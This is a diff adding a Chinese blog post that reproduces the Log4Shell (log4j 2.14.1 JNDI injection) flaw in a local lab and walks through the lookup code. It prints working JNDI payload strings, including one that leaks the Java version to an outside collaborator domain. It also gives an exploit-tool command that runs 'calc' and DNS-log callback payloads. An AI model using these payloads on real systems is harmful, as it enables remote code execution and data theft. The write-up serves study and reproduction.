@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="cn">
+
+<head>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="This_is_Y">
+    
+    <title>
+        
+            log4j |
+        
+        This_is_Y
+    </title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="shortcut icon" href="/images/title.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"cn","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":false},"style":{"primary_color":"#33CCCC","avatar":"/images/head.png","favicon":"/images/title.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/Watch.png","description":"Life is but a Dream"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":false},"version":"3.4.1"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+</head>
+
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                This_is_Y
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories/cnblogs"
+                            >
+                                CNBLOGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/Game"
+                            >
+                                GAME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/ReShell"
+                            >
+                                SHELL
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories/cnblogs">CNBLOGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/Game">GAME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/ReShell">SHELL</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">log4j</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/head.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">This_is_Y</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2021-12-20 10:26:57
+    </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>参考：<br><a class="link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HW2-VRg44ZEFcWxBmDk-CA">https://mp.weixin.qq.com/s/HW2-VRg44ZEFcWxBmDk-CA<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="java版本"><a href="#java版本" class="headerlink" title="java版本"></a>java版本</h3><p>我试过jdk1.8.0_202，8.0.292.hs-adpt。最后是用的<strong>jdk1.8.0_102</strong>才成功的,具体原因还不知道。</p>
+<p><img src="image-20211220104933657.png" alt="image-20211220104933657"></p>
+<p>因为使用git bash安装的sdkman改变的java版本貌似只能改变gitbash内的java，不过找到了它下载的路径，于是自己写了一个小脚本来修改java环境变量，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">java1 = <span class="string">r&quot;C:\Program Files\Java&quot;</span></span><br><span class="line">java2 = <span class="string">r&quot;C:\Users\This_is_Y\.sdkman\candidates\java&quot;</span></span><br><span class="line">javapath = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_javapath</span>(<span class="params">javafold</span>):</span></span><br><span class="line">    <span class="keyword">global</span> javapath</span><br><span class="line">    dbtype_list = os.listdir(javafold)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dbtype_list:</span><br><span class="line">        java_path = javafold+<span class="string">&quot;\\&quot;</span>+i</span><br><span class="line">        javapath.append(java_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changgepath</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">global</span> javapath</span><br><span class="line">    java = javapath[num-<span class="number">1</span>]</span><br><span class="line">    command =<span class="string">&quot;setx JAVA_HOME \&quot;%s\&quot; &quot;</span>%java</span><br><span class="line">    <span class="built_in">print</span>(command)</span><br><span class="line">    t = os.system(command)\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_javapath(java1)</span><br><span class="line">get_javapath(java2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(javapath)):</span><br><span class="line">    <span class="built_in">print</span>(i+<span class="number">1</span>,javapath[i])</span><br><span class="line"></span><br><span class="line">num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>))</span><br><span class="line">changgepath(num)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;=================新打开一个命令窗口执行以下命令查看是否更换成功=================&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cmd /c echo %JAVA_HOME%&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;java -version&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;javac -version&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>idea，新建一个maven项目</p>
+<h4 id="添加log4j"><a href="#添加log4j" class="headerlink" title="添加log4j"></a>添加log4j</h4><p>然后文件-项目结构,模块-依赖，添加库，把log4j-api-2.14.1和log4j-core-2.14.1添加进去。一般搞过java这些东西的，电脑里都会有，用everything搜一下就有了，实在没有的话，去<a class="link" target="_blank" rel="noopener" href="https://archive.apache.org/dist/logging/log4j/2.14.1/%E4%B8%8B%E8%BD%BD%E4%B8%80%E4%B8%AA%E5%B0%B1%E5%A5%BD%E4%BA%86">https://archive.apache.org/dist/logging/log4j/2.14.1/下载一个就好了<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="image-20211220103949109.png" alt="image-20211220103949109"><img src="image-20211220104030015.png" alt="image-20211220104030015"></p>
+<h4 id="main-入口类"><a href="#main-入口类" class="headerlink" title="main 入口类"></a>main 入口类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">log4j</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(log4j.class);</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;payload&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="JNDI-Injection-Exploit"><a href="#JNDI-Injection-Exploit" class="headerlink" title="JNDI-Injection-Exploit"></a>JNDI-Injection-Exploit</h4><p><a class="link" target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/releases">https://github.com/welk1n/JNDI-Injection-Exploit/releases<i class="fas fa-external-link-alt"></i></a><br>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “calc” -A “127.0.0.1”</p>
+<ul>
+<li><p>参数说明</p>
+<ul>
+<li><p>-C ：远程 class 文件中要执行的命令。</p>
+</li>
+<li><p>-A ：服务器地址，可以是 ip 或者域名</p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>注意事项</p>
+<ul>
+<li>要确保 1099,1389，8180 端口可用，或下载源码在 run.ServerStart 类 26~28 行更改默认端口，再打包成 jar 包运行</li>
+<li>命令会作为参数传入 Runtime.getRuntime().exec()，所以需要确保命令传入 exec() 方法可执行。</li>
+<li>bash 等可在 shell 直接执行的相关命令需要加双引号，比如说 java -jar JNDI.jar -C “bash -c …”</li>
+</ul>
+</li>
+</ul>
+<p><img src="image-20211220105325704.png" alt="image-20211220105325704"><br>因为使用的jdkjdk1.8.0_102，选择rmi://127.0.0.1:1099/pu7fje,ldap://127.0.0.1:1389/pu7fje这两个.<br>payload:<br><strong>${jndi:rmi://127.0.0.1:1099/pu7fje}</strong><br><strong>${jndi:ldap://127.0.0.1:1389/pu7fje}</strong><br>然后直接右键运行就可以了<br><img src="image-20211220105719454.png" alt="image-20211220105719454"><br>然后就是<br><img src="image-20211220105823608.png" alt="image-20211220105823608"></p>
+<h4 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a>DNSLOG</h4><p>利用<a class="link" target="_blank" rel="noopener" href="http://ceye.io/">ceye<i class="fas fa-external-link-alt"></i></a>或者<a class="link" target="_blank" rel="noopener" href="http://www.dnslog.cn/">dnglo<i class="fas fa-external-link-alt"></i></a>或者其他平台，获取一个域名<br>payload:<br><strong>${jndi:rmi://log4j.xxxxxx.dnslog.cn/exp}</strong><br><strong>${jndi:rmi://log4j.xxxxxx.ceye.io/exp}</strong></p>
+<p><img src="image-20211220111302956.png" alt="image-20211220111302956"></p>
+<p>结果</p>
+<p><img src="image-20211220111355708.png" alt="image-20211220111355708"></p>
+<p><img src="image-20211220111421037.png" alt="image-20211220111421037"></p>
+<p>值得注意的是，虽然在域名后面，要加点东西（随便什么都可以），直接甩一个链接上来的话，是接收不到回显的。</p>
+<p>这种方式也可以获取一些数据<br>payload:<br><strong>${jndi:ldap://${sys:java.version}.collaborator.com}</strong><br>可以获取的数据如图：</p>
+<p><img src="image-20211220112122398.png" alt="image-20211220112122398"></p>
+<p><img src="image-20211220113241376.png" alt="image-20211220113241376"></p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><h4 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h4><p>本次漏洞触发相当简单，只要使用了org/apache/logging/log4j/spi/AbstractLogger.java log进行记录，且log等级为可记录等级即可触发。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private static final Logger logger &#x3D; LogManager.getLogger();</span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">  logger.error(&quot;$&#123;jndi:ldap:&#x2F;&#x2F;ip:1389&#x2F;#Exploit&#125;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一旦在log字符串中检测到${}，就会解析其中的字符串尝试使用lookup查询，因此只要能控制log参数内容，就有机会实现漏洞利用。因此也可以使用如下方式触发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.error(&quot;8881273asdf$&#123;jndi:ldap:&#x2F;&#x2F;ip:1389&#x2F;#Exploit&#125;aksdjfhuip8efas&quot;);</span><br></pre></td></tr></table></figure>
+
+<h4 id="入口函数"><a href="#入口函数" class="headerlink" title="入口函数"></a>入口函数</h4><p>本次漏洞的入口函数为logIfEnabled，然而如果使用了AbstractLogger.java中的debug、info、warn、error、fatal等都会触发到该函数<br>这次复现使用的就是error</p>
+<p><img src="image-20211220152514594.png" alt="image-20211220152514594"></p>
+<p><img src="image-20211220152521989.png" alt="image-20211220152521989"></p>
+<h4 id="核心原理之匹配"><a href="#核心原理之匹配" class="headerlink" title="核心原理之匹配"></a>核心原理之匹配</h4><p>该漏洞的核心原理为，在正常的log处理过程中对 ${ 这两个紧邻的字符做了检测，一旦匹配到类似于表达式结构的字符串就会触发替换机制。<br>检测的地方在\log4j-core-2.14.1.jar!\org\apache\logging\log4j\core\pattern\MessagePatternConverter.class这个类里面，代码运行到这里的时候，workingBuilder的值是15:12:56.541 [main] ERROR log4j - ${jndi:rmi://127.0.0.1:1099/pu7fje}</p>
+<p><img src="image-20211220152809339.png" alt="image-20211220152809339"></p>
+<p>检测到${连在一起后，进入log4j-core-2.14.1.jar!\org\apache\logging\log4j\core\lookup\StrSubstitutor.class </p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/01/08/badusb%E6%95%B4%E7%90%86/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">badusb整理</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/12/13/windows%E4%B8%8B%E5%AE%89%E8%A3%85sdkman/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">windows下安装sdkman</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script data-pjax
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'pnLUL03RCIjbXBNX6m4sBrtq-gzGzoHsz',
+                    appKey: 'itjAi31G55tfhpSKJiuLDe2g',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '生命是上天的馈赠，我不想虚度年华',
+                    lang: 'cn'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = 'This_is_Y';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('true') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">This_is_Y</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.1</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#java%E7%89%88%E6%9C%AC"><span class="nav-number">1.1.</span> <span class="nav-text">java版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="nav-number">1.2.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0log4j"><span class="nav-number">1.2.1.</span> <span class="nav-text">添加log4j</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#main-%E5%85%A5%E5%8F%A3%E7%B1%BB"><span class="nav-number">1.2.2.</span> <span class="nav-text">main 入口类</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">1.3.</span> <span class="nav-text">利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JNDI-Injection-Exploit"><span class="nav-number">1.3.1.</span> <span class="nav-text">JNDI-Injection-Exploit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNSLOG"><span class="nav-number">1.3.2.</span> <span class="nav-text">DNSLOG</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91"><span class="nav-number">1.4.1.</span> <span class="nav-text">漏洞触发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%A5%E5%8F%A3%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.2.</span> <span class="nav-text">入口函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E4%B9%8B%E5%8C%B9%E9%85%8D"><span class="nav-number">1.4.3.</span> <span class="nav-text">核心原理之匹配</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/toc.js"></script>
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        const pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
